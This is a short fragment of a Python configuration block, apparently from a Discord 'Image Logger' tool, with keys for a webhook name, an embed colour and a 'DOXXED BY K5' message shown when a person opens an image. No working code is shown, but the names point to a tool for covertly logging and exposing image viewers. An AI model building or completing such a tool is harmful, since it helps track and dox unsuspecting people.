...
config = {
    ...
    # CUSTOMIZATION #
    "K5OWNSYOU": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x880808, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    ...
    "DOXXED BY K5": { # Show a custom message when the user opens the image
